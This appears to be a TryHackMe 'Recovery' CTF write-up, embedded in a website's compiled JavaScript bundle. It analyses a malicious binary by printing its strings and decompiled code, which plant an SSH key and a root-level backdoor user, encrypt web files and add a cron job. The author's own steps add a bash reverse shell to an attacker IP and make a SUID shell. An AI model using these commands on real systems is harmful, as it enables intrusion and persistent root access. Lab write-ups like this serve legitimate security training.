"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3537],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>h});var r=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var l=r.createContext({}),c=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},p=function(e){var n=c(e.components);return r.createElement(l.Provider,{value:n},e.children)},_="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},d=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,a=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),_=c(t),d=o,h=_["".concat(l,".").concat(d)]||_[d]||u[d]||a;return t?r.createElement(h,s(s({ref:n},p),{},{components:t})):r.createElement(h,s({ref:n},p))}));function h(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=t.length,s=new Array(a);s[0]=d;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[_]="string"==typeof e?e:o,s[1]=i;for(var c=2;c<a;c++)s[c]=t[c];return r.createElement.apply(null,s)}return r.createElement.apply(null,t)}d.displayName="MDXCreateElement"},90267:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>u,frontMatter:()=>a,metadata:()=>i,toc:()=>c});var r=t(87462),o=(t(67294),t(3905));const a={},s="Recovery",i={unversionedId:"Tryhackme/Recovery/Recovery",id:"Tryhackme/Recovery/Recovery",title:"Recovery",description:"Not your conventional CTF",source:"@site/writeups/Tryhackme/Recovery/Recovery.md",sourceDirName:"Tryhackme/Recovery",slug:"/Tryhackme/Recovery/",permalink:"/writeups/Tryhackme/Recovery/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Racetrack Bank",permalink:"/writeups/Tryhackme/Racetrack Bank/"},next:{title:"Relevant",permalink:"/writeups/Tryhackme/Relevant/Relevent"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Help Alex!",id:"task-1-help-alex",level:2}],p={toc:c},_="wrapper";function u(e){let{components:n,...t}=e;return(0,o.kt)(_,(0,r.Z)({},p,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"recovery"},"Recovery"),(0,o.kt)("p",null,"Not your conventional CTF"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/recovery"},"Recovery")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Reverse Engineering (Bash)"),(0,o.kt)("li",{parentName:"ul"},"Exploiting Crontab"),(0,o.kt)("li",{parentName:"ul"},"Reverse Engineering (Cpp)")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-help-alex"},"Task 1 Help Alex!"),(0,o.kt)("p",null,"Hi, it's me, your friend Alex."),(0,o.kt)("p",null,"I'm not going to beat around the bush here; I need your help. As you know I work at a company called Recoverysoft. I work on the website side of things, and I setup a Ubuntu web server to run it. Yesterday one of my work colleagues sent me the following email:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"Hi Alex,\nA recent security vulnerability has been discovered that affects the web server. Could you please run this binary on the server to implement the fix?\nRegards\n- Teo\n")),(0,o.kt)("p",null,"Attached was a linux binary called fixutil. As instructed, I ran the binary, and all was good. But this morning, I tried to log into the server via SSH and I received this message:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"YOU DIDN'T SAY THE MAGIC WORD!\nYOU DIDN'T SAY THE MAGIC WORD!\nYOU DIDN'T SAY THE MAGIC WORD!\n")),(0,o.kt)("p",null,"It turns out that Teo got his mail account hacked, and fixutil was a targeted malware binary specifically built to destroy my webserver!"),(0,o.kt)("p",null,"when I opened the website in my browser I get some crazy nonsense. The webserver files had been encrypted! Before you ask, I don't have any other backups of the webserver (I know, I know, horrible practice, etc...), I don't want to tell my boss, he'll fire me for sure."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Please access the web server and repair all the damage caused by fixutil. You can find the binary in my home directory. Here are my ssh credentials:")),(0,o.kt)("p",null,"Username: ",(0,o.kt)("inlineCode",{parentName:"p"},"alex"),"\nPassword: ",(0,o.kt)("inlineCode",{parentName:"p"},"madeline")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"I have setup a control panel to track your progress on port 1337."),' Access it via your web browser. As you repair the damage, you can refresh the page to receive those "flags" I know you love hoarding.'),(0,o.kt)("p",null,"Good luck!"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Your friend Alex")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Recovery$ sudo nmap -p- -A -sS -sC -sV -O 10.10.164.149\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 20:57 CEST\nNmap scan report for 10.10.164.149\nHost is up (0.039s latency).\nNot shown: 65531 closed ports\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 55:17:c1:d4:97:ba:8d:82:b9:60:81:39:e4:aa:1e:e8 (RSA)\n|   256 8d:f5:4b:ab:23:ed:a3:c0:e9:ca:90:e9:80:be:14:44 (ECDSA)\n|_  256 3e:ae:91:86:81:12:04:e4:70:90:b1:40:ef:b7:f1:b6 (ED25519)\n80/tcp    open  http    Apache httpd 2.4.43 ((Unix))\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.43 (Unix)\n|_http-title: Site doesn't have a title (text/html).\n1337/tcp  open  http    nginx 1.14.0 (Ubuntu)\n|_http-server-header: nginx/1.14.0 (Ubuntu)\n|_http-title: Help Alex!\n65499/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 b9:b6:aa:93:8d:aa:b7:f3:af:71:9d:7f:c5:83:1d:63 (RSA)\n|   256 64:98:14:38:ff:38:05:7e:25:ae:5d:33:2d:b6:78:f3 (ECDSA)\n|_  256 ef:2e:60:3a:de:ea:2b:25:7d:26:da:b5:6b:5b:c4:3a (ED25519)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/24%OT=22%CT=1%CU=32782%PV=Y%DS=2%DC=T%G=Y%TM=5F9479\nOS:5F%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC\nOS:N(R=Y%DF=Y%T=3F%W=FAF0%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 143/tcp)\nHOP RTT      ADDRESS\n1   37.45 ms 10.8.0.1\n2   37.75 ms 10.10.164.149\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 69.54 seconds\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Recovery$ ssh alex@10.10.164.149 -p 22 /bin/sh\nalex@10.10.164.149's password:\nsed '$d' .bashrc\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"# ~/.bashrc: executed by bash(1) for non-login shells.\n# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)\n# for examples\n\n# If not running interactively, don't do anything\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\n\n# don't put duplicate lines or lines starting with space in the history.\n# See bash(1) for more options\nHISTCONTROL=ignoreboth\n\n# append to the history file, don't overwrite it\nshopt -s histappend\n\n# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)\nHISTSIZE=1000\nHISTFILESIZE=2000\n\n# check the window size after each command and, if necessary,\n# update the values of LINES and COLUMNS.\nshopt -s checkwinsize\n\n# If set, the pattern \"**\" used in a pathname expansion context will\n# match all files and zero or more directories and subdirectories.\n#shopt -s globstar\n\n# make less more friendly for non-text input files, see lesspipe(1)\n#[ -x /usr/bin/lesspipe ] && eval \"$(SHELL=/bin/sh lesspipe)\"\n\n# set variable identifying the chroot you work in (used in the prompt below)\nif [ -z \"${debian_chroot:-}\" ] && [ -r /etc/debian_chroot ]; then\n    debian_chroot=$(cat /etc/debian_chroot)\nfi\n\n# set a fancy prompt (non-color, unless we know we \"want\" color)\ncase \"$TERM\" in\n    xterm-color|*-256color) color_prompt=yes;;\nesac\n\n# uncomment for a colored prompt, if the terminal has the capability; turned\n# off by default to not distract the user: the focus in a terminal window\n# should be on the output of commands, not on the prompt\n#force_color_prompt=yes\n\nif [ -n \"$force_color_prompt\" ]; then\n    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then\n        # We have color support; assume it's compliant with Ecma-48\n        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such\n        # a case would tend to support setf rather than setaf.)\n        color_prompt=yes\n    else\n        color_prompt=\n    fi\nfi\n\nif [ \"$color_prompt\" = yes ]; then\n    PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\nelse\n    PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ '\nfi\nunset color_prompt force_color_prompt\n\n# If this is an xterm set the title to user@host:dir\ncase \"$TERM\" in\nxterm*|rxvt*)\n    PS1=\"\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1\"\n    ;;\n*)\n    ;;\nesac\n\n# enable color support of ls and also add handy aliases\nif [ -x /usr/bin/dircolors ]; then\n    test -r ~/.dircolors && eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -b)\"\n    alias ls='ls --color=auto'\n    #alias dir='dir --color=auto'\n    #alias vdir='vdir --color=auto'\n\n    #alias grep='grep --color=auto'\n    #alias fgrep='fgrep --color=auto'\n    #alias egrep='egrep --color=auto'\nfi\n\n# colored GCC warnings and errors\n#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'\n\n# some more ls aliases\n#alias ll='ls -l'\n#alias la='ls -A'\n#alias l='ls -CF'\n\n# Alias definitions.\n# You may want to put all your additions into a separate file like\n# ~/.bash_aliases, instead of adding them here directly.\n# See /usr/share/doc/bash-doc/examples in the bash-doc package.\n\nif [ -f ~/.bash_aliases ]; then\n    . ~/.bash_aliases\nfi\n\n# enable programmable completion features (you don't need to enable\n# this, if it's already enabled in /etc/bash.bashrc and /etc/profile\n# sources /etc/bash.bashrc).\nif ! shopt -oq posix; then\n  if [ -f /usr/share/bash-completion/bash_completion ]; then\n    . /usr/share/bash-completion/bash_completion\n  elif [ -f /etc/bash_completion ]; then\n    . /etc/bash_completion\n  fi\nfi\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"rm -rf .bashrc\nls\nfixutil\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Recovery$ ssh alex@10.10.164.149 -p 22\nalex@10.10.164.149's password:\nLinux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020 x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nalex@recoveryserver:~$ ls\nfixutil\nalex@recoveryserver:~$ scp fixutil kali@10.8.106.222:/home/kali/CTFs/tryhackme/Recovery\nThe authenticity of host '10.8.106.222 (10.8.106.222)' can't be established.\nECDSA key fingerprint is SHA256:xCE0Cpa4vJaXG1mwn7ciMO55E0R11HvAmXVl2ymdG+Y.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.8.106.222' (ECDSA) to the list of known hosts.\nkali@10.8.106.222's password:\nfixutil                                                   100%   36KB 450.2KB/s   00:00\nalex@recoveryserver:~$\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Recovery$ chmod +x fixutil\nkali@kali:~/CTFs/tryhackme/Recovery$ strings fixutil\n/lib64/ld-linux-x86-64.so.2\nlibc.so.6\nfopen\nfclose\nsystem\nfwrite\n__cxa_finalize\n__libc_start_main\nGLIBC_2.2.5\n_ITM_deregisterTMCloneTable\n__gmon_start__\n_ITM_registerTMCloneTable\nu+UH\n[]A\\A]A^A_\n__gmon_start__\n_ITM_deregisterTMCloneTable\n_ITM_registerTMCloneTable\n__cxa_finalize\nweb_location\nencryption_key_dir\n__stack_chk_fail\nGetWebFiles\nopendir\nstrcmp\nstrlen\nmalloc\nexit\nstrcpy\nstrncat\nclosedir\nreaddir\nXORFile\nfopen\nfseek\nftell\nfread\nfclose\nfwrite\nXOREncryptWebFiles\nmkdir\nfprintf\nfree\nLogIncorrectAttempt\nsystem\ntime\nsrand\nchmod\nlibc.so.6\n__xstat\nGLIBC_2.4\nGLIBC_2.2.5\nu+UH\nabcdefghH\nijklmnopH\nqrstuvwxH\nyzABCDEFH\nGHIJKLMNH\nOPQRSTUVH\nWXYZ\ndH34%(\n/usr/local/apache2/htdocs/\n/opt/.fixutil/\n/opt/.fixutil/backup.txt\n/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery\n/root/.ssh/authorized_keys\n/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null\n/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e\n/opt/brilliant_script.sh\n#!/bin/sh\nfor i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;\n/etc/cron.d/evil\n* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog\n:*3$\"\nGCC: (Ubuntu 9.3.0-10ubuntu2) 9.3.0\n/usr/lib/gcc/x86_64-linux-gnu/9/include\n/usr/include/x86_64-linux-gnu/bits\n/usr/include/x86_64-linux-gnu/bits/types\n/usr/include\nreplacelogging.c\nstddef.h\ntypes.h\nstruct_FILE.h\nFILE.h\nstdio.h\nsys_errlist.h\nstruct_timespec.h\ndirent.h\ntime.h\nunistd.h\ngetopt_core.h\nstat.h\ndirent.h\nssh_key\n_shortbuf\n_IO_lock_t\nstderr\n_IO_buf_end\nXORFile\noptopt\n_IO_write_end\n_freeres_list\nst_blksize\n_flags\nweb_location\nencryption_file\n_markers\n__nlink_t\nmax_amnt_webfiles\nd_name\n__timezone\n__ino_t\nstdout\n_IO_save_end\n/home/moodr/Boxes/recovery/fixutil\nopterr\n_IO_codecvt\nlong long unsigned int\nst_blocks\nd_reclen\nsys_errlist\n_IO_backup_base\nsys_nerr\nf_contents\nwebfile_w\n_fileno\nstat\ntv_nsec\nindex_of_encryption_key\n__mode_t\nd_type\nwebfile_r\n_IO_read_base\nst_gid\nstdin\nst_mode\nst_nlink\nattempt\ntimespec\n__daylight\n_IO_marker\n_IO_read_ptr\nreplacelogging.c\nst_ino\n_IO_write_base\nlong long int\n_IO_save_base\n__dev_t\nwebfile\noptind\n__syscall_slong_t\n_freeres_buf\n__pad0\n__pad5\n__glibc_reserved\nwebfile_names\nXOREncryptWebFiles\n_vtable_offset\noptarg\n__gid_t\ndirent\n_IO_read_end\nshort int\nst_mtim\ncron_f\n_IO_wide_data\nGNU C17 9.3.0 -mtune=generic -march=x86-64 -g -fpic -fasynchronous-unwind-tables -fstack-protector-strong -fstack-clash-protection -fcf-protection\n__environ\nencryption_key_dir\nd_off\n__blksize_t\n__uid_t\nst_atim\n_lock\ntv_sec\nGetWebFiles\n_old_offset\n_IO_FILE\n__dirstream\nscript_f\nLogIncorrectAttempt\nunsigned char\n__tzname\nauthorized_keys\n_IO_write_ptr\nrand_string\n__time_t\nst_size\nd_ino\nst_uid\n__off_t\nst_ctim\nst_dev\nshort unsigned int\nstat_res\nf_path\ncharset\n__blkcnt_t\n_chain\nst_rdev\n_flags2\n_cur_column\n__off64_t\n_unused2\n_IO_buf_base\ncrtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux\ncompleted.8059\n__do_global_dtors_aux_fini_array_entry\nframe_dummy\n__frame_dummy_init_array_entry\nreplacelogging.c\nrand_string\n__FRAME_END__\n__stat\n_fini\n__dso_handle\n_DYNAMIC\n__GNU_EH_FRAME_HDR\n__TMC_END__\n_GLOBAL_OFFSET_TABLE_\n_init\nfree@@GLIBC_2.2.5\n_ITM_deregisterTMCloneTable\nstrcpy@@GLIBC_2.2.5\nmkdir@@GLIBC_2.2.5\nencryption_key_dir\nfread@@GLIBC_2.2.5\nfclose@@GLIBC_2.2.5\nopendir@@GLIBC_2.2.5\nGetWebFiles\nstrlen@@GLIBC_2.2.5\n__stack_chk_fail@@GLIBC_2.4\nsystem@@GLIBC_2.2.5\nstrncat@@GLIBC_2.2.5\nclosedir@@GLIBC_2.2.5\nsrand@@GLIBC_2.2.5\nLogIncorrectAttempt\nXORFile\nstrcmp@@GLIBC_2.2.5\nfprintf@@GLIBC_2.2.5\nftell@@GLIBC_2.2.5\n__gmon_start__\ntime@@GLIBC_2.2.5\n__xstat@@GLIBC_2.2.5\nreaddir@@GLIBC_2.2.5\nmalloc@@GLIBC_2.2.5\nXOREncryptWebFiles\nfseek@@GLIBC_2.2.5\nchmod@@GLIBC_2.2.5\nweb_location\nfopen@@GLIBC_2.2.5\nexit@@GLIBC_2.2.5\nfwrite@@GLIBC_2.2.5\n_ITM_registerTMCloneTable\n__cxa_finalize@@GLIBC_2.2.5\n.symtab\n.strtab\n.shstrtab\n.note.gnu.property\n.note.gnu.build-id\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_r\n.rela.dyn\n.rela.plt\n.init\n.plt.got\n.plt.sec\n.text\n.fini\n.rodata\n.eh_frame_hdr\n.eh_frame\n.init_array\n.fini_array\n.dynamic\n.got.plt\n.data\n.bss\n.comment\n.debug_aranges\n.debug_info\n.debug_abbrev\n.debug_line\n.debug_str\n/home/alex/.bashrc\nwhile :; do echo \"YOU DIDN'T SAY THE MAGIC WORD!\"; done &\n/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so\n/lib/x86_64-linux-gnu/liblogging.so\necho pwned | /bin/admin > /dev/null\n:*3$\"\nGCC: (Ubuntu 9.3.0-10ubuntu2) 9.3.0\ncrtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux\ncompleted.8059\n__do_global_dtors_aux_fini_array_entry\nframe_dummy\n__frame_dummy_init_array_entry\nfixutil.c\nbin2c_liblogging_so\n__FRAME_END__\n__init_array_end\n_DYNAMIC\n__init_array_start\n__GNU_EH_FRAME_HDR\n_GLOBAL_OFFSET_TABLE_\n__libc_csu_fini\n_ITM_deregisterTMCloneTable\n_edata\nfclose@@GLIBC_2.2.5\nsystem@@GLIBC_2.2.5\n__libc_start_main@@GLIBC_2.2.5\n__data_start\n__gmon_start__\n__dso_handle\n_IO_stdin_used\n__libc_csu_init\n__bss_start\nmain\nfopen@@GLIBC_2.2.5\nfwrite@@GLIBC_2.2.5\n__TMC_END__\n_ITM_registerTMCloneTable\n__cxa_finalize@@GLIBC_2.2.5\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"cat /etc/cron.d/evil\n\n* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"ls\nbrilliant_script.sh\ncat brilliant_script.sh\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-sh"},"#!/bin/sh\n\nfor i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"cp /bin/bash /tmp/bash && chmod +s /tmp/bash\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"bash-5.0# find / -type f -name *html 2>/dev/null\n/usr/local/apache2/htdocs/index.html\n/usr/local/apache2/htdocs/todo.html\n/usr/local/apache2/icons/README.html\n/usr/local/apache2/error/include/spacer.html\n/usr/local/apache2/error/include/top.html\n/usr/local/apache2/error/include/bottom.html\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"bash-5.0# find / -type f -newermt 2020-06-15 ! -newermt 2020-06-19 -exec ls -la {} \\; 2> /dev/null\n-rw-r--r-- 1 root root 16 Jun 17 21:22 /opt/.fixutil/backup.txt\n-rwsr-xr-x 1 root root 16928 Jun 17 08:55 /bin/admin\n-rw-r--r-- 1 root root 32032 Jun 17 08:55 /var/log/faillog\n-rw-r--r-- 1 root root 0 Jun 17 08:55 /var/lib/sudo/lectured/alex\n-rw-r--r-- 1 root root 1376 Jun 17 08:55 /etc/passwd-\n-rw-r----- 1 root shadow 865 Jun 17 21:21 /etc/shadow-\n-rw-r--r-- 1 root root 1415 Jun 17 21:21 /etc/passwd\n-rw-r--r-- 1 root root 40 Jun 17 21:22 /etc/subgid\n-rw-r----- 1 root shadow 970 Jun 17 21:22 /etc/shadow\n-rw-r--r-- 1 root root 615 Jun 17 08:55 /etc/group\n-rw-r--r-- 1 root root 40 Jun 17 21:22 /etc/subuid\n-rw-r----- 1 root shadow 515 Jun 17 08:55 /etc/gshadow\n-rw-r--r-- 1 root root 18 Jun 17 08:55 /etc/subgid-\n-rwxr-xr-x 1 root root 61 Jun 17 21:22 /etc/cron.d/evil\n-rw-r--r-- 1 root root 18 Jun 17 08:55 /etc/subuid-\n---------- 1 root root 0 Jun 17 21:33 /run/crond.reboot\n-rw-r--r-- 1 root root 567 Jun 17 21:21 /root/.ssh/authorized_keys\n-rwxrwxr-x 1 root root 54 Jun 17 08:55 /root/init_script.sh\n-rw-rw-r-- 1 root root 997 Jun 17 21:22 /usr/local/apache2/htdocs/index.html\n-rw-rw-r-- 1 root root 85 Jun 17 21:22 /usr/local/apache2/htdocs/todo.html\n-rw-rw-r-- 1 root root 109 Jun 17 21:22 /usr/local/apache2/htdocs/reallyimportant.txt\n-rwxr-xr-x 1 alex alex 16048 Jun 17 21:21 /lib/x86_64-linux-gnu/oldliblogging.so\n-rwxrwxrwx 1 root root 23176 Jun 17 21:21 /lib/x86_64-linux-gnu/liblogging.so\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-cpp"},'void LogIncorrectAttempt(char *attempt)\n\n{\n  time_t tVar1;\n  FILE *__stream;\n  char *ssh_key;\n  FILE *authorized_keys;\n  FILE *script_f;\n  FILE *cron_f;\n\n  system("/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so");\n  tVar1 = time((time_t *)0x0);\n  srand((uint)tVar1);\n  __stream = fopen("/root/.ssh/authorized_keys","w");\n  fprintf(__stream,"%s\\n",\n\n          "ssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery"\n         );\n  fclose(__stream);\n  system("/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null");\n  system(\n        "/bin/echo\\\'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/\\\' | /usr/sbin/chpasswd -e"\n        );\n  XOREncryptWebFiles();\n  __stream = fopen("/opt/brilliant_script.sh","w");\n  fwrite(\n         "#!/bin/sh\\n\\nfor i in $(ps aux | grep bash | grep -v grep | awk \\\'{print $2}\\\'); do kill$i; done;\\n"\n         ,1,0x5f,__stream);\n  fclose(__stream);\n  __stream = fopen("/etc/cron.d/evil","w");\n  fwrite("\\n* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog\\n\\n",1,0x3d,__stream);\n  fclose(__stream);\n  chmod("/opt/brilliant_script.sh",0x1ff);\n  chmod("/etc/cron.d/evil",0x1ed);\n  return;\n}\n\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'cat > /tmp/a.sh << "EOF"\n#!/bin/bash\nbash -i >& /dev/tcp/10.8.106.222/9001 0>&1\nEOF\n\necho "bash /tmp/a.sh" >> /opt/brilliant_script.sh\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'echo "ssh-rsa 